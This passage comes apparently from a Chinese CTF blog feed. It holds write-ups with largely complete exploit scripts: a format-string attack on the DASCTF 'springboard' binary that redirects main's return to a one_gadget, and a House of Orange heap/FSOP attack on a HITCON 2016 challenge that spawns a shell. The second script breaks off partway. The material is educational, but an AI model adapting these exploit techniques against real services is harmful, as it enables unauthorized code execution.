<p>同过<code>&quot;%&#123;&#125;c%13$hhn&quot;</code>控制39$指向19$的偏移0-7，通过<code>&quot;%&#123;&#125;c%39$hhn&quot;</code>改写19$偏移0-7的内容<br>也就是可以在19$上布置任意地址，再通过<code>&quot;%&#123;&#125;c%19$hhn&quot;</code>就可以任意地址写了</p>
<p>改写main函数返回地址为one_gadget即可，</p>
<p>最后把循环变量改回整数，使得循环退出，main函数返回触发one_gadget</p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./springboard'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span> <span class="token number">10029</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'libc.so.6'</span> <span class="token comment"># libc-2.27</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#rs('remote')</span>

<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'input your name:'</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>

<span class="token comment"># leak libc stack</span>
send<span class="token punctuation">(</span><span class="token string">'%11$p\n%13$p\n\x00'</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'name:\n'</span><span class="token punctuation">)</span>
__libc_start_main  <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">231</span>
lbase <span class="token operator">=</span> __libc_start_main <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> __libc_start_main<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>

stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'stack'</span><span class="token punctuation">,</span> stack<span class="token punctuation">)</span>

<span class="token comment"># 修改i变量为负数</span>
ref_i <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x7fffffffedf8</span> <span class="token operator">+</span> <span class="token number">0x7fffffffecfc</span>
off <span class="token operator">=</span> <span class="token punctuation">(</span>ref_i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
<span class="token keyword">if</span> off <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
    send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%13$hn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>off<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    send<span class="token punctuation">(</span><span class="token string">'%13$hhn\n\x00'</span><span class="token punctuation">)</span>
send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%39$hhn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment"># 形成13$->39$->19$一条链先</span>
target_addr <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x7fffffffedf8</span> <span class="token operator">+</span> <span class="token number">0x7fffffffed58</span>
off <span class="token operator">=</span> target_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
<span class="token keyword">if</span> off <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
    send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%13$hn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>off<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    send<span class="token punctuation">(</span><span class="token string">'%13$hn\n\x00'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">set_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        byte <span class="token operator">=</span> <span class="token punctuation">(</span>addr <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
        off <span class="token operator">=</span> <span class="token punctuation">(</span>target_addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
        <span class="token keyword">if</span> off <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%13$hhn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>off<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            send<span class="token punctuation">(</span><span class="token string">'%13$hhn\n\x00'</span><span class="token punctuation">)</span>


        <span class="token keyword">if</span> byte <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%39$hhn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            send<span class="token punctuation">(</span><span class="token string">'%39$hhn\n\x00'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">write_byte</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> byte <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        send<span class="token punctuation">(</span><span class="token string">'%&#123;&#125;c%19$hhn\n\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        send<span class="token punctuation">(</span><span class="token string">'%19$hhn\n\x00'</span><span class="token punctuation">)</span>


ref_ret <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token number">0x7fffffffedf8</span> <span class="token operator">+</span>  <span class="token number">0x7fffffffed18</span>
set_addr<span class="token punctuation">(</span>ref_ret<span class="token punctuation">)</span>


one1 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x4f2c5</span>
one2 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x4f322</span>
one3 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x10a38c</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    byte <span class="token operator">=</span> <span class="token punctuation">(</span>one1 <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
    set_addr<span class="token punctuation">(</span>ref_ret<span class="token operator">+</span>i<span class="token punctuation">)</span>
    write_byte<span class="token punctuation">(</span>byte<span class="token punctuation">)</span>



<span class="token comment">#dbg('b *%s\nc' % hex(one1))</span>
<span class="token comment"># 改回正数，使得循环退出</span>
set_addr<span class="token punctuation">(</span>ref_i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
write_byte<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">#dbg('b *0x55555555495b')</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>dasctf</tag>
      </tags>
  </entry>
  <entry>
    <title>houseoforange_hitcon_2016</title>
    <url>/6a6ded9c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之houseoforange_hitcon_2016</p>
<span id="more"></span>

<p>参考文章：<a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p>
<p>保护全开<br><img src="/images/6a6ded9c/1.png" alt="upload successful"></p>
<p>有add，show，edit，没free</p>
<p>add只有4次：<br><img src="/images/6a6ded9c/2.png" alt="upload successful"></p>
<p>show<br><img src="/images/6a6ded9c/3.png" alt="upload successful"></p>
<p>edit只有3次，但是写入数据的长度可控，可溢出<br><img src="/images/6a6ded9c/4.png" alt="upload successful"></p>
<p>house of orange具体在没有free功能的情况下，制造出free的chunk，思路是溢出修改top chunk的size，然后malloc比top chunk大的chunk，使得top chunk被释放进入unsorted bin</p>
<p>一些检查：</p>
<ul>
<li>top chunk的size要4K对齐</li>
<li>pre_in_use位置1</li>
</ul>
<p>修改top chunk的size后</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>

fake_name <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x80</span>
fake_name <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token comment"># color chunk</span>
fake_name <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># color structure</span>
fake_name <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf31</span><span class="token punctuation">)</span> <span class="token comment"># top chunk: pre_size, size</span>

edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_name<span class="token punctuation">)</span><span class="token punctuation">,</span> fake_name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/6a6ded9c/5.png" alt="upload successful"></p>
<p>malloc一个比top chunk大的chunk，top chunk将会被释放进入unsorted bin</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># free top chunk</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/images/6a6ded9c/6.png" alt="upload successful"></p>
<p>之后再malloc一个large bin大小的chunk，将从unsorted bin切割出来，bk仍然存有main_arena的地址，bk后面的fd_nextsize又有堆的地址，可以泄露出来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 从unsorted bin中切割一块出来 'a' * 8 是fd，后面就是bk</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> addr <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd2188</span> <span class="token operator">-</span> <span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>


edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
hbase <span class="token operator">=</span> addr <span class="token operator">&amp;</span> <span class="token number">0xffFFffFFffFFf000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/images/6a6ded9c/7.png" alt="upload successful"></p>
<p>之后就是unsorted bin attack，修改_IO_list_all为unsorted bin的地址，而unsorted bin + 0x68(_IO_FILE_plus的_chain字段)是0x60大小的small chunk，要是把覆盖unsorted bin 中的chunk的size成0x60，那么_chain将填成这个chunk的地址，就把这个chunk当成_IO_FILE_plus结构了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

fake_file <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token comment"># pre_size, size</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># fd, bk</span>

pay <span class="token operator">+=</span> fake_file

edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>通过unsorted bin attack将_IO_list_all改成unsorted bin的地址<br><img src="/images/6a6ded9c/8.png" alt="upload successful"></p>
<p>并且+0x68处，已经改成这个chunk的地址<br><img src="/images/6a6ded9c/9.png" alt="upload successful"></p>
<p>开始FSOP</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xddaa</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

chunk_addr <span class="token operator">=</span> hbase <span class="token operator">+</span> <span class="token number">0x560</span>

fake_file <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token comment"># pre_size, size</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># fd, bk</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># _IO_write_base, _IO_write_ptr</span>
fake_file <span class="token operator">=</span> fake_file<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># _mode</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span>chunk_addr <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># vtable</span>

fake_vtable <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
fake_vtable <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># _IO_OVERFLOW</span>

pay <span class="token operator">+=</span> fake_file <span class="token operator">+</span> fake_vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完整exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token comment">#!/usr/bin/python2</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

